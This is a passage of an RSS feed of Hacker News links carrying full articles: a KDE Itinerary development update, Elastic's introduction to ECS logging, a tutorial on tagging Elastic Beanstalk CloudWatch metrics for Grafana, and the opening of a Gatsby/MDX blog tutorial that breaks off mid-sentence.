January 30, 2021 | https://www.volkerkrause.eu/2021/01/30/kde-itinerary-december-january-2021.html | <a href="https://web.archive.org/web/*/https://www.volkerkrause.eu/2021/01/30/kde-itinerary-december-january-2021.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>The end of your holiday break didn’t slow down work on <a href="https://apps.kde.org/en/itinerary">KDE Itinerary</a>,
so we have a lot of news again since the <a href="https://www.volkerkrause.eu/2020/11/28/kde-itinerary-october-november-2020.html">last summary blog</a>
two month ago!</p>

<h3 id="new-features">New Features</h3>

<p>The most visible new feature is the realtime status for elevators and escalators in the
train station map view. I have <a href="https://www.volkerkrause.eu/2020/12/26/kde-wrapping-up-2020.html">previously written</a>
about why this is useful and <a href="https://accessibility.cloud/">where we get the data from</a>,
and meanwhile this has been fully integrated into the app.</p>

<figure>
  
  <img src="https://www.volkerkrause.eu/assets/posts/73/kde-itinerary-realtime-elevator-status.png" alt="Screenshot of KDE Itinerary's train station map showing working elevators and green and those currently out of service in red.">
  
  <figcaption>KDE Itinerary's train station map showing realtime status information for elevators.</figcaption>
</figure>

<p>Technically this requires that we match external information about elevators/escalators with <a href="https://openstreetmap.org/">OSM</a> data,
not unlike what we already have to do for railway platforms for example. This has the nice side-effect
that it allows us to automatically correct common data issues on the way.</p>

<p>For elevators one such issue is that each floor level has its independent OSM element,
rather than there being one element that spans multiple floors. We now detect that and merge this
into a single elevator element, which makes the floor level navigation in our map view work
in this case as well.</p>

<p>Another new feature in the train station map is its ability to
<a href="https://www.volkerkrause.eu/2020/12/12/kde-itinerary-opening-hours-integration.html">evaluate OSM opening hours expressions</a>.</p>

<figure>
  
  <img src="https://www.volkerkrause.eu/assets/posts/72/kde-itinerary-station-map-opening-hours-details.png" alt="Opening hours information for a selected element on the map presented both in textual and visual form.">
  
  <figcaption>Textual description of the current opening state and visual overview of the current week.</figcaption>
</figure>

<p>With the library for this, <a href="https://commits.kde.org/kopeninghours">KOpeningHours</a>, also being used by the
<a href="https://wiki.openstreetmap.org/wiki/Osmose">Osmose</a> OSM validation tool,
a lot of work has gone into the precision and tolerance of the opening hours parser and evaluator,
all also benefiting the use in KDE Itinerary.</p>

<p>OSM contains about 500k distinct <a href="https://wiki.openstreetmap.org/wiki/Key:opening_hours/specification">opening hours expressions</a>
(about 1.8M total), about 16k of those are rejected as invalid by KOpeningHours (and largely for good reasons),
and another 137k are considered to be not strictly valid but understood thanks
to the improved parser tolerance nevertheless. This results in even values like <code>Du Mardi au Vendredi 11h00-13h30 Le samedi 10h-19h</code>
being interpreted now that are much closer to human language than the technically correct
machine readable form for this (<code>Tu-Fr 11:00-13:30; Sa 10:00-19:00</code>).</p>

<h3 id="infrastructure-work">Infrastructure Work</h3>

<p>The <a href="https://github.com/public-transport/transport-apis">Transport APIs Repository</a> initiative is gaining momentum,
and <a href="https://commits.kde.org/kpublictransport">KPublicTransport</a> has seen a number of changes to consume this data.
The Transport API Repository is a collaboration with a number of other public transport
client implementors to share machine-readable descriptions of the various API endpoints,
their respective protocols and parameters as well as metadata (such as the covered regions).</p>

<p>KPublicTransport (and thus its consumers Itinerary and KTrip) will directly benefit from this by sharing
maintenance load with more people, and gaining support for more transport operators. The improved
coverage metadata might also allow us to implement a much more efficient way of doing a global
name-based location search.</p>

<p>Another thing we did to support data improvements benefiting our applications are the
<a href="https://www.volkerkrause.eu/2021/01/16/kde-osm-indoor-map-demo-app.html">nightly Flatpak and Android builds of the standalone KOSMIndoorMap demo app</a>,
which should help with reviewing OSM indoor map data.</p>

<h3 id="fixes--improvements">Fixes &amp; Improvements</h3>

<p>There’s plenty of smaller but still noteworthy changes too of course, all over the place.</p>



<ul>
  <li>Improved or new extractor scripts for Accor and Agoda hotel reservations, as well as some SNCF TER ticket variants.</li>
  <li>Migrated to a new barcode reader API in collaboration with the <a href="https://github.com/nu-book/zxing-cpp/">ZXing</a> developers.
This simplifies our code as it provides proper support for input from “pure” sources (e.g. perfect black/white graphics rather than
say blurry camera images), and gives us better performance.</li>
</ul>

<h4 id="train-station-maps">Train station maps</h4>

<ul>
  <li>Distinguish between dock-based and floating rental bikes.</li>
  <li>Fix rendering of multi-polygons with multiple adjacent outer polygons. This previously resulted
in bizarre glitches in complex buildings like the Frankfurt airport railway station or some of Paris Charles de Gaulle’s terminals.</li>
  <li>Fix railway platform edges and airport taxiways being misrendered when having certain unnecessary OSM tags.</li>
  <li>Make the element information dialog accessible for interactive elements like stairs, elevators or escalators as well
via a long-press action.</li>
</ul>

<h4 id="itinerary-app">Itinerary app</h4>

<ul>
  <li>Fixed a large number of layouting and resizing glitches all over the place.</li>
  <li>Fixed a few page routing issues impacting desktop users.</li>
  <li>Allow to open an external map application from within the indoor map view, in case you want to see the surrounding area too.</li>
  <li>Fixed timeline display for events without an associated location.</li>
  <li>Network status monitoring now also works within a Flatpak, fixing automatic map download there.</li>
  <li>Fixed timelines entries being wrongly calculated when occurring close toa day boundary.</li>
  <li>Fixed a rounding error in the sun position math in KF5::Holidays that would result in the sun not rising
if you found yourself in the wrong place at the wrong time.</li>
  <li>Fixed determining of arrival/departure platforms for multi-section transfers.</li>
  <li>Fixed opening the indoor map view for timeline elements that aren’t location changes (such as accommodation or events).</li>
</ul>

<h3 id="contribute">Contribute</h3>

<p>While field testing and collecting travel document samples remains difficult in many parts of the world, there’s plenty
of other things that can be done. The <a href="https://phabricator.kde.org/project/view/280/">KDE Itinerary workboard</a> or the
more specialized <a href="https://invent.kde.org/libraries/kpublictransport/-/boards/1930">indoor map workboard</a> show
what’s on the todo list, and are a good place for collecting new ideas. For questions and suggestions, please feel free
to join us on <a href="https://mail.kde.org/mailman/listinfo/kde-pim">the KDE PIM mailing list</a> or in the <code>#kontact</code> channel on Matrix or Freenode,
or meet us next week at <a href="https://fosdem.org/2021/">FOSDEM 2021</a>!</p>

  </div></div>]]>
            </description>
            <link>https://www.volkerkrause.eu/2021/01/30/kde-itinerary-december-january-2021.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25969183</guid>
            <pubDate>Sat, 30 Jan 2021 14:08:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elastic Common Schema (ECS)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25969135">thread link</a>) | @based2
<br/>
January 30, 2021 | https://www.elastic.co/guide/en/ecs-logging/overview/master/intro.html | <a href="https://web.archive.org/web/*/https://www.elastic.co/guide/en/ecs-logging/overview/master/intro.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <section id="content">
        <div>

          <section id="guide" lang="en">
            <div>
              <div>
                <div>
                  <!-- start body -->
                  
<div id="content">


<div>

<p>Centralized application logging with the Elastic stack made easy.</p>
<p><span><img src="https://user-images.githubusercontent.com/2163464/62682932-9cac3600-b9bd-11e9-9cc3-39e907280f8e.png" alt="62682932 9cac3600 b9bd 11e9 9cc3 39e907280f8e"></span></p>
<h3><a id="_what_is_ecs"></a>What is ECS?<a rel="nofollow" title="Edit this page on GitHub" href="https://github.com/elastic/ecs-logging/edit/master/docs/intro.asciidoc">edit</a></h3>
<p>Elastic Common Schema (ECS) defines a common set of fields for ingesting data into Elasticsearch.
For more information about ECS, visit the <a href="https://www.elastic.co/guide/en/ecs/1.6/ecs-reference.html" target="_top">ECS Reference Documentation</a>.</p>
<h3><a id="_what_is_ecs_logging"></a>What is ECS logging?<a rel="nofollow" title="Edit this page on GitHub" href="https://github.com/elastic/ecs-logging/edit/master/docs/intro.asciidoc">edit</a></h3>
<p>ECS loggers are plugins for your favorite logging library.
They make it easy to format your logs into ECS-compatible JSON. For example:</p>
<div>
<pre>{"@timestamp":"2019-08-06T12:09:12.375Z", "log.level": "INFO", "message":"Tomcat started on port(s): 8080 (http) with context path ''", "service.name":"spring-petclinic","process.thread.name":"restartedMain","log.logger":"org.springframework.boot.web.embedded.tomcat.TomcatWebServer"}
{"@timestamp":"2019-08-06T12:09:12.379Z", "log.level": "INFO", "message":"Started PetClinicApplication in 7.095 seconds (JVM running for 9.082)", "service.name":"spring-petclinic","process.thread.name":"restartedMain","log.logger":"org.springframework.samples.petclinic.PetClinicApplication"}
{"@timestamp":"2019-08-06T14:08:40.199Z", "log.level":"DEBUG", "message":"init find form", "service.name":"spring-petclinic","process.thread.name":"http-nio-8080-exec-8","log.logger":"org.springframework.samples.petclinic.owner.OwnerController","transaction.id":"28b7fb8d5aba51f1","trace.id":"2869b25b5469590610fea49ac04af7da"}</pre>
</div>
<h3><a id="_get_started"></a>Get started<a rel="nofollow" title="Edit this page on GitHub" href="https://github.com/elastic/ecs-logging/edit/master/docs/intro.asciidoc">edit</a></h3>
<p>Refer to the installation instructions of the individual loggers:</p>

<h3><a id="_why_ecs_logging"></a>Why ECS logging?<a rel="nofollow" title="Edit this page on GitHub" href="https://github.com/elastic/ecs-logging/edit/master/docs/intro.asciidoc">edit</a></h3>
<div>
<dl>
<dt>
<span>
<span><strong>No parsing of the log file required</strong></span>
</span>
</dt>
<dd>
<p>ECS-compatible JSON doesn’t require the use of Logstash or grok parsing via an ingest node pipeline.</p>
</dd>
<dt>
<span>
<span><strong>Decently human-readable JSON structure</strong></span>
</span>
</dt>
<dd>
<p>The first three fields are always <code>@timestamp</code>, <code>log.level</code> and <code>message</code>.
It’s also possible to format stack traces so that each element is rendered in a new line.</p>
</dd>
<dt>
<span>
<span><strong>Enjoy the benefits of a common schema</strong></span>
</span>
</dt>
<dd>
<p>Use the Kibana <a href="https://www.elastic.co/guide/en/observability/7.10/monitor-logs.html" target="_top">Logs app</a> without additional configuration.</p>
<p>Using a common schema across different services and teams makes it possible create reusable dashboards and avoids <a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.10/mapping.html#mapping-limit-settings" target="_top">mapping explosions</a>.</p>
</dd>
<dt>
<span>
<span><strong>APM Log correlation</strong></span>
</span>
</dt>
<dd>
<p>If you are using an <a href="https://www.elastic.co/guide/en/apm/agent/index.html" target="_top">Elastic APM agent</a>,
you can leverage the <a href="https://www.elastic.co/guide/en/apm/get-started/7.10/observability-integrations.html#apm-logging-integration" target="_top">log correlation feature</a> without any additional configuration.
This lets you jump from the <a href="https://www.elastic.co/guide/en/kibana/7.10/spans.html" target="_top">Span timeline in the APM UI</a> to the <a href="https://www.elastic.co/guide/en/observability/7.10/monitor-logs.html" target="_top">Logs app</a>,
showing only the logs which belong to the corresponding request.
Vice versa, you can also jump from a log line in the Logs UI to the Span Timeline of the APM UI.</p>
</dd>
</dl>
</div>
<h4><a id="_additional_advantages_when_using_in_combination_with_filebeat"></a>Additional advantages when using in combination with Filebeat<a rel="nofollow" title="Edit this page on GitHub" href="https://github.com/elastic/ecs-logging/edit/master/docs/intro.asciidoc">edit</a></h4>
<p>We recommend shipping the logs with Filebeat.
Depending on the way the application is deployed, you may log to a log file or to stdout (for example in Kubernetes).</p>
<p>Here are a few benefits to over directly sending logs from the application to Elasticsearch:</p>
<div>
<dl>
<dt>
<span>
<span><strong>Resilient in case of outages</strong></span>
</span>
</dt>
<dd>
<p><a href="https://www.elastic.co/guide/en/beats/filebeat/7.10/how-filebeat-works.html#at-least-once-delivery" target="_top">Guaranteed at-least-once delivery</a>
without buffering within the application, thus no risk of out of memory errors or lost events.
There’s also the option to use either the JSON logs or plain-text logs as a fallback.</p>
</dd>
<dt>
<span>
<span><strong>Loose coupling</strong></span>
</span>
</dt>
<dd>
<p>The application does not need to know the details of the logging backend (URI, credentials, etc.).
You can also leverage alternative <a href="https://www.elastic.co/guide/en/beats/filebeat/7.10/configuring-output.html" target="_top">Filebeat outputs</a>,
like Logstash, Kafka or Redis.</p>
</dd>
<dt>
<span>
<span><strong>Index Lifecycle management</strong></span>
</span>
</dt>
<dd>
<p>Leverage Filebeat’s default <a href="https://www.elastic.co/guide/en/beats/filebeat/7.10/ilm.html" target="_top">index lifecycle management settings</a>.
This is much more efficient than using daily indices.</p>
</dd>
<dt>
<span>
<span><strong>Efficient Elasticsearch mappings</strong></span>
</span>
</dt>
<dd>
<p>Leverage Filebeat’s default ECS-compatible <a href="https://www.elastic.co/guide/en/beats/filebeat/7.10/configuration-template.html" target="_top">index template</a>.</p>
</dd>
</dl>
</div>
<h3><a id="_field_mapping"></a>Field mapping<a rel="nofollow" title="Edit this page on GitHub" href="https://github.com/elastic/ecs-logging/edit/master/docs/intro.asciidoc">edit</a></h3>
<h4><a id="_default_fields"></a>Default fields<a rel="nofollow" title="Edit this page on GitHub" href="https://github.com/elastic/ecs-logging/edit/master/docs/intro.asciidoc">edit</a></h4>
<p>These fields are populated by the ECS loggers by default.
Some of them, such as the <code>log.origin.*</code> fields, may have to be explicitly enabled.
Others, such as <code>process.thread.name</code>, are not applicable to all languages.
Refer to the documentation of the individual loggers for more information.</p>
<div>
<table>
<colgroup>
<col>
<col>
<col>
</colgroup>
<thead>
<tr>
<th>ECS field</th>
<th>Description</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td><p><a href="https://www.elastic.co/guide/en/ecs/1.6/ecs-base.html" target="_top"><code>@timestamp</code></a></p></td>
<td><p>The timestamp of the log event.</p></td>
<td><p><code>"2019-08-06T12:09:12.375Z"</code></p></td>
</tr>
<tr>
<td><p><a href="https://www.elastic.co/guide/en/ecs/1.6/ecs-log.html" target="_top"><code>log.level</code></a></p></td>
<td><p>The level or severity of the log event.</p></td>
<td><p><code>"INFO"</code></p></td>
</tr>
<tr>
<td><p><a href="https://www.elastic.co/guide/en/ecs/1.6/ecs-log.html" target="_top"><code>log.logger</code></a></p></td>
<td><p>The name of the logger inside an application.</p></td>
<td><p><code>"org.example.MyClass"</code></p></td>
</tr>
<tr>
<td><p><a href="https://www.elastic.co/guide/en/ecs/1.6/ecs-log.html" target="_top"><code>log.origin.file.name</code></a></p></td>
<td><p>The name of the file containing the source code which originated the log event.</p></td>
<td><p><code>"App.java"</code></p></td>
</tr>
<tr>
<td><p><a href="https://www.elastic.co/guide/en/ecs/1.6/ecs-log.html" target="_top"><code>log.origin.file.line</code></a></p></td>
<td><p>The line number of the file containing the source code which originated the log event.</p></td>
<td><p><code>42</code></p></td>
</tr>
<tr>
<td><p><a href="https://www.elastic.co/guide/en/ecs/1.6/ecs-log.html" target="_top"><code>log.origin.function</code></a></p></td>
<td><p>The name of the function or method which originated the log event.</p></td>
<td><p><code>"methodName"</code></p></td>
</tr>
<tr>
<td><p><a href="https://www.elastic.co/guide/en/ecs/1.6/ecs-base.html" target="_top"><code>message</code></a></p></td>
<td><p>The log message.</p></td>
<td><p><code>"Hello World!"</code></p></td>
</tr>
<tr>
<td><p><a href="https://www.elastic.co/guide/en/ecs/1.6/ecs-error.html" target="_top"><code>error.type</code></a></p></td>
<td><p>Only present for logs that contain an exception or error.
 The type or class of the error if this log event contains an exception.</p></td>
<td><p><code>"java.lang.NullPointerException"</code></p></td>
</tr>
<tr>
<td><p><a href="https://www.elastic.co/guide/en/ecs/1.6/ecs-error.html" target="_top"><code>error.message</code></a></p></td>
<td><p>Only present for logs that contain an exception or error.
 The message of the exception or error.</p></td>
<td><p><code>"The argument cannot be null"</code></p></td>
</tr>
<tr>
<td><p><a href="https://www.elastic.co/guide/en/ecs/1.6/ecs-error.html" target="_top"><code>error.stack_trace</code></a></p></td>
<td><p>Only present for logs that contain an exception or error.
 The full stack trace of the exception or error as a raw string.</p></td>
<td><p><code>"Exception in thread "main" java.lang.NullPointerException\n\tat org.example.App.methodName(App.java:42)"</code></p></td>
</tr>
<tr>
<td><p><a href="https://www.elastic.co/guide/en/ecs/1.6/ecs-process.html" target="_top"><code>process.thread.name</code></a></p></td>
<td><p>The name of the thread the event has been logged from.</p></td>
<td><p><code>"main"</code></p></td>
</tr>
</tbody>
</table>
</div>
<h4><a id="_configurable_fields"></a>Configurable fields<a rel="nofollow" title="Edit this page on GitHub" href="https://github.com/elastic/ecs-logging/edit/master/docs/intro.asciidoc">edit</a></h4>
<p>Refer to the documentation of the individual loggers on how to set these fields.</p>

<h4><a id="_custom_fields"></a>Custom fields<a rel="nofollow" title="Edit this page on GitHub" href="https://github.com/elastic/ecs-logging/edit/master/docs/intro.asciidoc">edit</a></h4>
<p>Most loggers allow you to add additional custom fields.
This includes both, static and dynamic ones.
Examples for dynamic fields are logging structured objects,
or fields from a thread local context, such as <code>MDC</code> or <code>ThreadContext</code>.</p>
<p>When adding custom fields, we recommend using existing <a href="https://www.elastic.co/guide/en/ecs/1.6/ecs-field-reference.html" target="_top">ECS fields</a> for these custom values.
If there is no appropriate ECS field,
consider prefixing your fields with <code>labels.</code>, as in <code>labels.foo</code>, for simple key/value pairs.
For nested structures, consider prefixing with <code>custom.</code>.
This approach protects against conflicts in case ECS later adds the same fields but with a different mapping.</p>
</div>

</div>

                  <!-- end body -->
                </div>
                
              </div>
            </div>
          </section>

        </div>




<!-- Footer Section end-->

      </section>
    </div></div>]]>
            </description>
            <link>https://www.elastic.co/guide/en/ecs-logging/overview/master/intro.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25969135</guid>
            <pubDate>Sat, 30 Jan 2021 14:03:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Monitoring AWS Elastic Beanstalk Memory and Disk Usage in Grafana]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25969100">thread link</a>) | @weejewel
<br/>
January 30, 2021 | https://emilenijssen.nl/8-aws-elastic-beanstalk-cloudwatch-ram-and-disk-monitoring/ | <a href="https://web.archive.org/web/*/https://emilenijssen.nl/8-aws-elastic-beanstalk-cloudwatch-ram-and-disk-monitoring/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

  <a href="https://emilenijssen.nl/"><img src="https://emilenijssen.nl/img/me.jpg" alt="My head"></a>
  <p>Emile Nijssen's Blog</p>

  
  
<p>By default AWS Elastic Beanstalk only monitors CPU, Network, etc. but no in-machine statistics such as the amounf of free memory and disk space usage.</p>
<p>Their <a href="https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/customize-containers-cw.html">tutorial</a> uses a CloudWatch Agent, but this only tags the instance ID (e.g. <code>i-12345</code>), which is very useless if you want to monitor in Grafana. What I want to see is the environment name (e.g. <code>myapp-prod</code>).</p>
<p>This solution uses a CloudWatch Agent to save metrics to CloudWatch as well, but tags all metrics with the environment name.</p>
<h2 id="1-setup-aws-elastic-beanstalk">1. Setup AWS Elastic Beanstalk</h2>
<p>Save this file as <code>/.ebextensions/cloudwatch.config</code> to automatically monitor and tag these into CloudWatch. You can then easily import those into Grafana (or the tool of your liking).</p>
<pre><code><span>packages:</span>
  <span>rpm:</span>
    <span>amazon-cloudwatch-agent:</span> <span>https://s3.amazonaws.com/amazoncloudwatch-agent/amazon_linux/amd64/latest/amazon-cloudwatch-agent.rpm</span>
<span>files:</span>
  <span>"/home/ec2-user/amazon-cloudwatch-agent.json"</span><span>:</span>
    <span>mode:</span> <span>"000755"</span>
    <span>owner:</span> <span>root</span>
    <span>group:</span> <span>root</span>
    <span>content:</span> <span>|
      {
        "agent": {
          "metrics_collection_interval": 60
        },
        "metrics": {
          "append_dimensions": {
            "InstanceId": "${aws:InstanceId}"
          },
          "metrics_collected": {
            "mem": {
              "measurement": [
                "mem_total",
                "mem_free",
                "mem_used",
                "mem_used_percent",
                "mem_available",
                "mem_available_percent"
              ],
              "append_dimensions": {
                "AWSEBEnvironmentName": "__EB_ENV__"
              }
            },
            "cpu": {
              "measurement": [
                "cpu_time_active",
                "cpu_time_nice",
                "cpu_time_steal",
                "cpu_usage_active",
                "cpu_usage_idle",
                "cpu_usage_iowait"
              ],
              "append_dimensions": {
                "AWSEBEnvironmentName": "__EB_ENV__"
              }
            },
            "disk": {
              "measurement": [
                "disk_free",
                "disk_total",
                "disk_used",
                "disk_used_percent"
              ],
              "append_dimensions": {
                "AWSEBEnvironmentName": "__EB_ENV__"
              }
            }
          }
        }
      }
</span><span>container_commands:</span>
  <span>01_prepare_cloudwatch_agent_config:</span>
    <span>command:</span> <span>|
      EB_ENV="$(/opt/elasticbeanstalk/bin/get-config container -k environment_name)"
      sed -i "s/__EB_ENV__/$EB_ENV/g" /home/ec2-user/amazon-cloudwatch-agent.json
</span>  <span>02_run_cloudwatch_agent:</span>
    <span>command:</span> <span>|</span>
      <span>amazon-cloudwatch-agent-ctl</span> <span>-a</span> <span>fetch-config</span> <span>-m</span> <span>ec2</span> <span>-c</span> <span>file:/home/ec2-user/amazon-cloudwatch-agent.json</span> <span>-s</span></code></pre>
<h2 id="2-setup-grafana">2. Setup Grafana</h2>
<p>In your Grafana dashboard, create two variables:<br>
<img src="https://emilenijssen.nl/8-aws-elastic-beanstalk-cloudwatch-ram-and-disk-monitoring/img/variables.png" alt=""></p>
<pre><code><span>Name:</span> Region
<span>Type:</span> Query
Data <span>Source:</span> CloudWatch
<span>Query:</span> regions()</code></pre>
<pre><code><span>Name:</span> Environment
<span>Type:</span> Query
Data <span>Source:</span> CloudWatch
<span>Query:</span> dimension_values($Region,CWAgent,mem_free,AWSEBEnvironmentName)</code></pre>
<p>And then create a Chart as follows:<br>
<img src="https://emilenijssen.nl/8-aws-elastic-beanstalk-cloudwatch-ram-and-disk-monitoring/img/chart.png" alt=""></p>
<p>You can make this a repeating row to monitor all your environments:<br>
<img src="https://emilenijssen.nl/8-aws-elastic-beanstalk-cloudwatch-ram-and-disk-monitoring/img/stats.png" alt=""></p>
<p>Good luck!</p>

  <a href="https://emilenijssen.nl/">â†� All Posts</a>

  


</div>]]>
            </description>
            <link>https://emilenijssen.nl/8-aws-elastic-beanstalk-cloudwatch-ram-and-disk-monitoring/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25969100</guid>
            <pubDate>Sat, 30 Jan 2021 13:59:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build a coding blog from scratch with Gatsby and MDX]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25969064">thread link</a>) | @spences10
<br/>
January 30, 2021 | https://scottspence.com/2019/10/31/build-an-mdx-blog/ | <a href="https://web.archive.org/web/*/https://scottspence.com/2019/10/31/build-an-mdx-blog/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><section></section><section><small><a href="https://scottspence.com/tags/learning">learning</a></small><small><a href="https://scottspence.com/tags/gatsby">gatsby</a></small><small><a href="https://scottspence.com/tags/guide">guide</a></small><small><a href="https://scottspence.com/tags/mdx">mdx</a></small><small><a href="https://scottspence.com/tags/markdown">markdown</a></small></section><p>I have been a Gatsby user since around <a href="https://github.com/spences10/blog.scottspence.me/tree/a470e8563e1a040527cf2094fc1b377550a88c77" target="_blank" rel="noopener">v0 May 2017</a>, at that time was
using a template called <a href="https://github.com/alxshelepenok/gatsby-starter-lumen" target="_blank" rel="noopener">Lumen</a> and it was just what I needed at the
time. Since then I have have gone from using a template to creating my
blog.</p><p>Over the years I have made my own <a href="https://lengstorf.com/progressive-disclosure-of-complexity/" target="_blank" rel="noopener">Progressive Disclosure of
Complexity</a> with Gatsby to where I am now.</p><h2 id="what-does-that-mean"><a href="#what-does-that-mean" aria-label="what does that mean permalink"></a>What does that mean?</h2><p>It means that although there are an awesome amount of Gatsby starters
and themes out there to get you up and running in minutes, this post
is going to focus on what you need to do to build your own blog.
Starting with the most basic “Hello World!” to deploying your code to
production.</p><h2 id="what-youre-going-to-build"><a href="#what-youre-going-to-build" aria-label="what youre going to build permalink"></a>What you’re going to build</h2><p>You’re going to build a developer blog with MDX support (for some
React components in Markdown goodness), so you will be able to add
your own React components into your Markdown posts.</p><p><strong>There’ll be:</strong></p><div><ul><li>Adding a Layout</li><li>Basic styling with styled-components</li><li>Code blocks with syntax highlighting</li><li>Copy code snippet to clipboard</li><li>Cover images for the posts</li><li>Configuring an SEO component</li><li>Deploying it to Netlify</li></ul></div><h2 id="whos-this-how-to-for"><a href="#whos-this-how-to-for" aria-label="whos this how to for permalink"></a>Who’s this how-to for?</h2><p>People that may have used Gatsby before as a template and now want to
get more involved in how to make changes.</p><p>If you want to have code syntax highlighting.</p><p>If you want to use styled-components in an app.</p><p><strong>I really want to avoid this!</strong></p><p><span>
      <a href="https://scottspence.com/static/c94426ee247944669175d7575b851f60/dba9a/draw-a-horse-quincy-tweet.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="draw a horse quincy tweet" title="draw a horse quincy tweet" src="https://scottspence.com/static/c94426ee247944669175d7575b851f60/dba9a/draw-a-horse-quincy-tweet.png" srcset="https://scottspence.com/static/c94426ee247944669175d7575b851f60/5a46d/draw-a-horse-quincy-tweet.png 300w,https://scottspence.com/static/c94426ee247944669175d7575b851f60/0a47e/draw-a-horse-quincy-tweet.png 600w,https://scottspence.com/static/c94426ee247944669175d7575b851f60/dba9a/draw-a-horse-quincy-tweet.png 652w" sizes="(max-width: 652px) 100vw, 652px" loading="lazy">
  </a>
    </span></p><p><a href="https://twitter.com/ossia/status/588389121053200385" target="_blank" rel="noopener">draw a horse Quincy tweet</a></p><h2 id="requirements"><a href="#requirements" aria-label="requirements permalink"></a>Requirements</h2><p>You’re going to need a basic web development setup: node, terminal
(bash, zsh or fish) and a text editor.</p><p>I do like to use <a href="https://codesandbox.io/" target="_blank" rel="noopener">codesandbox.io</a> for these sort of guides to reduce
the barrier to entry but in this case I have found there are some
limitations with starting out from scratch on <a href="https://codesandbox.io/" target="_blank" rel="noopener">codesandbox.io</a> which
doesn’t make this possible.</p><p>I have made a guide on getting set up for web development with
<a href="http://scottspence.com/2018/12/24/wsl-bootstrap-2019/" target="_blank" rel="noopener">Windows Web-Dev Bootstrap</a> and covered the same process in <a href="https://www.youtube.com/watch?v=eSAsdQuQ-1o" target="_blank" rel="noopener">Ubuntu as
well</a>.</p><p>Ok? Time to get started!</p><h2 id="hello-world"><a href="#hello-world" aria-label="hello world permalink"></a>Hello World</h2><p>Kick this off with the Gatsby ‘hello world’, you’ll need to initialise
the project with:</p><p>I suggest that you commit this code to a git repository, so you should
start with a <code>.gitignore</code> file.</p><div><div data-language="bash"><pre data-linenumber="true"><p><span>1</span><span>touch</span><span> .gitignore</span></p><p><span>2</span><span></span></p><p><span>3</span><span></span><span>echo</span><span> </span><span>"# Project dependencies</span></p><p><span>4</span><span>.cache</span></p><p><span>5</span><span>node_modules</span></p><p><span>6</span><span></span></p><p><span>7</span><span># Build directory</span></p><p><span>8</span><span>public</span></p><p><span>9</span><span></span></p><p><span>10</span><span># Other</span></p><p><span>11</span><span>.DS_Store</span></p><p><span>12</span><span>yarn-error.log"</span><span> </span><span>&gt;</span><span> .gitignore</span></p></pre></div></div><p>Ok now is a good time to do a <code>git init</code> and if you’re using VSCode
you’ll see the changes reflected in the sidebar.</p><h3 id="basic-hello-world"><a href="#basic-hello-world" aria-label="basic hello world permalink"></a>basic hello world</h3><p>Ok a Gatsby hello world, get started with the bare minimum! Install
the following:</p><div><div data-language="bash"><pre data-linenumber="true"><p><span>1</span><span>yarn</span><span> </span><span>add</span><span> gatsby react react-dom</span></p></pre></div></div><p>You’re going to need to create a pages directory and add an index
file. You can do that in the terminal by typing the following:</p><div><div data-language="bash"><pre data-linenumber="true"><p><span>1</span><span></span></p><p><span>2</span><span></span><span>mkdir</span><span> -p src/pages</span></p><p><span>3</span><span></span><span>touch</span><span> src/pages/index.js</span></p></pre></div></div><p>Ok, now you can commence the hello word incantation! In the newly
created <code>index.js</code> enter the following:</p><div><div data-language="jsx"><pre data-linenumber="true"><p><span>1</span><span>import</span><span> React </span><span>from</span><span> </span><span>'react'</span><span></span></p><p><span>2</span><span></span></p><p><span>3</span><span></span><span>export</span><span> </span><span>default</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>4</span><span>  </span><span>return</span><span> </span><span>&lt;</span><span>h1</span><span>&gt;</span><span>Hello World</span><span>!</span><span>&lt;/</span><span>h1</span><span>&gt;</span><span></span></p><p><span>5</span><span></span><span>}</span></p></pre></div></div><p>Now you need to add the Gatsby develop script to the <code>package.json</code>
file, <code>-p</code> specifies what port you want to run the project on and <code>-o</code>
opens a new tab on your default browser, so in this case
<code>localhost:9988</code>:</p><div><div data-language="json"><pre data-linenumber="true"><p><span>1</span><span>"dev"</span><span>:</span><span> </span><span>"gatsby develop -p 9988 -o"</span></p></pre></div></div><p>Ok it’s time to run the code! From the terminal type the npm script
command you just created:</p><blockquote><p>Note I’m using Yarn for installing all my dependencies and running
scripts, if you prefer you can use npm just bear in mind that the
content on here uses yarn, so swap out commands where needed</p></blockquote><p>And with that the “Hello World” incantation is complete 🧙!</p><h2 id="add-content"><a href="#add-content" aria-label="add content permalink"></a>Add content</h2><p>Ok, now you have the base your blog you’re going to want to add some
content, first up we’re going to get the convention out of the way.
For this how-to, the date format will be a logical way, the most
logical way for a date format is <strong>YYYYMMDD</strong>, fight me!</p><p>So you’re going to structure your posts content in years, in each one
of those you’re going to have another folder relating to the post with
the (correct) date format for the beginning of the file followed by
the title of the post. You could drill into this further if you like
by separating out months and days depending on the volume of posts
going this may be a good approach. In this case and in the examples
